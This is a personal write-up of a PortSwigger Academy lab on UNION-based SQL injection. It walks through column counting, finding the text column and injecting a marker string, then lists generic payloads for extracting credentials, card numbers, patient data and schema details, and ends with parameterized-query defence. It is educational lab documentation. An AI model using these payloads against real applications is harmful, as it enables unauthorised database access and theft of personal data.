# Lab 9: SQL Injection UNION Attack - Finding a Column Containing Text

## Executive Summary

This lab demonstrates advanced SQL injection exploitation focused on identifying which columns in a database query accept string data types—a critical prerequisite for extracting textual information such as usernames, passwords, and sensitive data. After determining the query returns 3 columns using ORDER BY enumeration, I systematically tested each column with string injection to identify that only the second column accepts text values. By injecting the required string payload into the correct column position, I successfully completed the challenge, showcasing the methodology for data type discovery essential for targeted data exfiltration attacks.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Data Type Enumeration |
| **Risk**               | High - Foundation for Targeted Data Extraction |
| **Completion**         | February 15, 2026 |

## Objective

Exploit SQL injection to determine column count, identify which columns accept string data types, and inject a specific text value to demonstrate control over database output.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery
- Browser for result verification

**Target:** Product category filtering with SQL injection vulnerability

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection UNION attack, finding a column containing text" challenge.
<img width="1920" height="982" alt="LAB3_ss1" src="https://github.com/user-attachments/assets/f66c7977-556b-40cf-80b5-8c7d9d46b19d" />

*Lab 9 environment - String column identification with Burp Suite Professional configured*

### 2. Attack Surface Identification

Explored product categories to identify SQL injection vectors.

<img width="1920" height="982" alt="LAB3_ss2" src="https://github.com/user-attachments/assets/8bfc9890-92fb-4526-abe4-6aed10a7fe8b" />

*Category exploration - Gifts, Accessories, Tech & Gifts | HTTP request showing category parameter*

**Available Categories:**
- Gifts
- Accessories
- Tech & Gifts

**Request Captured:**
```http
GET /filter?category=Tech+%26+Gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts'
```

**Attack Vector:** Category parameter likely directly incorporated into SQL WHERE clause.

### 3. Column Count Enumeration

Sent request to Burp Repeater and determined column count using ORDER BY technique.

**Test Payloads:**
```http
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+1-- HTTP/1.1
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+2-- HTTP/1.1
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+3-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB3_ss3 1" src="https://github.com/user-attachments/assets/4f14f025-e204-4730-a0f3-146094618a74" />

*ORDER BY 3 test - 200 OK response confirms 3 columns exist*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' ORDER BY 3--'
```

**Response:** 200 OK

**Test Payload 4:**
```http
GET /filter?category=Tech+%26+Gifts'+ORDER+BY+4-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB3_ss3 2" src="https://github.com/user-attachments/assets/881659e3-98cd-492c-a516-187e548f2a1f" />

*ORDER BY 4 test - 500 Internal Server Error confirms only 3 columns*

**Response:** 500 Internal Server Error

**Column Count Confirmed:** Exactly **3 columns** in the query result set.

### 4. String Data Type Testing - Column 1

**Objective:** Identify which columns accept string data by systematically testing each column position with a string value.

**Why This Matters:**
- Different columns may have different data types (INTEGER, VARCHAR, DATE, etc.)
- String data can only be injected into VARCHAR/TEXT columns
- Incorrect data type causes SQL errors
- Must identify string columns for credential extraction

**Test Payload 1:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+'a',NULL,NULL-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB3_ss4 1" src="https://github.com/user-attachments/assets/eacee08d-3919-42e7-b296-166d905a3eff" />

*Column 1 string test - 500 Internal Server Error indicates first column does NOT accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT 'a', NULL, NULL--'
```

**Response:** 500 Internal Server Error

**Database Error (Inferred):**
```
Data type mismatch: cannot convert VARCHAR to INTEGER (or other non-string type)
```

**Analysis:** Column 1 does NOT accept string data. Likely an integer column (e.g., product_id).

### 5. String Data Type Testing - Column 2

**Test Payload 2:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+NULL,'a',NULL-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB3_ss4 2" src="https://github.com/user-attachments/assets/be59e061-e9d8-4815-a9c3-a96c54057d4e" />

*Column 2 string test - 200 OK indicates second column DOES accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT NULL, 'a', NULL--'
```

**Response:** 200 OK with 'a' displayed

**Analysis:** Column 2 ACCEPTS string data. This is the target column for text injection.

### 6. String Data Type Testing - Column 3

**Test Payload 3:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+NULL,'a','a'-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB3_ss4 3" src="https://github.com/user-attachments/assets/7c0eb7fa-9ba1-4f0b-9cd7-4670756decff" />

*Column 3 string test - 500 Internal Server Error indicates third column does NOT accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT NULL, 'a', 'a'--'
```

**Response:** 500 Internal Server Error

**Analysis:** Column 3 does NOT accept string data. Likely a numeric or date column.

**Data Type Mapping Completed:**

| Column Position | Data Type | Accepts Strings? |
|----------------|-----------|------------------|
| Column 1 | Numeric (INTEGER/FLOAT) | ❌ No |
| Column 2 | Text (VARCHAR/TEXT) | ✅ Yes |
| Column 3 | Numeric/Date | ❌ No |

### 7. Required String Injection

**Lab Requirement:** Inject the specific string `nUebdo` into the string-compatible column.

**Attack Payload:**
```http
GET /filter?category=Tech+%26+Gifts'+UNION+SELECT+NULL,'nUebdo',NULL-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB3_ss5" src="https://github.com/user-attachments/assets/40f6c024-ab51-47ab-988e-52fb68486de9" />

*Required string injected - 200 OK in Repeater (left) | Payload displayed in browser (right) confirming successful injection*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Tech & Gifts' 
UNION SELECT NULL, 'nUebdo', NULL--'
```

**Response:** 200 OK with 'nUebdo' successfully injected and displayed

**Attack Success:**
- ✅ Column count determined (3 columns)
- ✅ String-compatible column identified (column 2)
- ✅ Required text payload successfully injected
- ✅ Control over database output demonstrated

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: High (CVSS 7.5)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or input sanitization
- Enables data type discovery and targeted extraction
- Foundation for credential theft and data exfiltration

**Why Data Type Discovery is Critical:**

**1. Targeted Data Extraction:**
Once string columns are identified, attackers can extract sensitive textual data:
```sql
-- Column 2 accepts strings, so we can extract:
' UNION SELECT NULL, username, NULL FROM users--
' UNION SELECT NULL, password, NULL FROM users--
' UNION SELECT NULL, email, NULL FROM customers--
' UNION SELECT NULL, credit_card, NULL FROM payments--
```

**2. Database Version Discovery:**
```sql
-- MySQL
' UNION SELECT NULL, @@version, NULL--

-- PostgreSQL
' UNION SELECT NULL, version(), NULL--

-- Oracle
' UNION SELECT NULL, banner, NULL FROM v$version--
```

**3. Table and Column Enumeration:**
```sql
-- List all tables
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- List columns in users table
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

**Attack Progression:**
```
Column Count Discovery (3 columns)
        ↓
Data Type Testing
        ↓
Column 1: Numeric ❌
Column 2: String ✅ ← Target column
Column 3: Numeric ❌
        ↓
String Injection Capability Confirmed
        ↓
Database Version Extraction
        ↓
Table/Column Enumeration
        ↓
Credential Extraction
        ↓
Complete Database Compromise
```

**Data Type Testing Methodology:**

**Systematic Approach:**
```sql
-- Test Column 1
' UNION SELECT 'test', NULL, NULL--
  → Error? Column 1 is NOT string
  → Success? Column 1 IS string

-- Test Column 2
' UNION SELECT NULL, 'test', NULL--
  → Error? Column 2 is NOT string
  → Success? Column 2 IS string

-- Test Column 3
' UNION SELECT NULL, NULL, 'test'--
  → Error? Column 3 is NOT string
  → Success? Column 3 IS string
```

**Common Data Type Patterns:**

| Application | Column 1 | Column 2 | Column 3 |
|-------------|----------|----------|----------|
| **Products** | product_id (INT) | product_name (TEXT) | price (DECIMAL) |
| **Users** | user_id (INT) | username (VARCHAR) | created_date (DATE) |
| **Orders** | order_id (INT) | customer_name (TEXT) | order_total (DECIMAL) |

**Real-World Exploitation Examples:**

**E-Commerce Platform:**
```sql
-- Extract customer emails
' UNION SELECT NULL, email, NULL FROM customers--

-- Extract payment information
' UNION SELECT NULL, card_number, NULL FROM payments--
```

**Corporate Application:**
```sql
-- Extract employee credentials
' UNION SELECT NULL, username, NULL FROM employees--
' UNION SELECT NULL, password_hash, NULL FROM auth--
```

**Healthcare System:**
```sql
-- Extract patient records
' UNION SELECT NULL, patient_name, NULL FROM patients--
' UNION SELECT NULL, diagnosis, NULL FROM medical_records--
```

**Why This Attack Matters:**

**Before Data Type Discovery:**
- Attackers know SQL injection exists
- Column count is known
- But cannot extract meaningful data

**After Data Type Discovery:**
- ✅ Know exactly which columns accept strings
- ✅ Can extract usernames, passwords, emails
- ✅ Can enumerate database structure
- ✅ Can exfiltrate sensitive textual data
- ✅ Complete database compromise possible

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic column count enumeration
- Sequential data type testing for each column
- Identification of string-compatible columns
- Verification through targeted string injection

**Critical Security Insights:**

**1. Data Type Discovery is Essential:**
Knowing column count is insufficient—attackers must identify:
- Which columns accept strings (for text extraction)
- Which columns accept integers (for numeric data)
- Which columns are displayed in application output

**2. Systematic Testing Approach:**

**Step 1 - Column Count:**
```sql
' ORDER BY 1--  ✓
' ORDER BY 2--  ✓
' ORDER BY 3--  ✓
' ORDER BY 4--  ✗
Result: 3 columns
```

**Step 2 - Data Type Discovery:**
```sql
' UNION SELECT 'a', NULL, NULL--  ✗ (Column 1 not string)
' UNION SELECT NULL, 'a', NULL--  ✓ (Column 2 is string)
' UNION SELECT NULL, NULL, 'a'--  ✗ (Column 3 not string)
Result: Only column 2 accepts strings
```

**Step 3 - Data Extraction:**
```sql
' UNION SELECT NULL, username, NULL FROM users--
' UNION SELECT NULL, password, NULL FROM users--
```

**3. Alternative Testing Methods:**

**Using Numeric Values:**
```sql
-- Test if column accepts integers
' UNION SELECT 1, NULL, NULL--
' UNION SELECT NULL, 1, NULL--
' UNION SELECT NULL, NULL, 1--
```

**Using Multiple Data Types:**
```sql
-- Test all types simultaneously
' UNION SELECT 1, 'text', 3.14--
```

**4. Error Message Analysis:**

**Informative Error (Development Mode):**
```
Error: Column 1 expected INTEGER but received VARCHAR
```

**Generic Error (Production):**
```
500 Internal Server Error
```

Both provide the same information through success/failure patterns.

**5. Defense Requires Prevention, Not Detection:**

**Vulnerable Code:**
```python
query = "SELECT id, name, price FROM products WHERE category = '" + category + "'"
```

**Secure Code:**
```python
query = "SELECT id, name, price FROM products WHERE category = ?"
cursor.execute(query, [category])
```

**Why Parameterized Queries Prevent All Testing:**
- User input never interpreted as SQL code
- Data type testing attempts treated as literal strings
- UNION injections completely blocked
- No column enumeration possible
- Complete protection against SQL injection

**Professional Skills Demonstrated:**
- Systematic column enumeration methodology
- Data type discovery through error analysis
- Sequential testing approach
- Understanding of SQL data types
- Targeted payload crafting
- Verification through browser-based validation

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. OWASP SQL Injection Prevention Cheat Sheet
5. SQL Data Types Reference

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems or database enumeration is illegal under applicable laws worldwide.
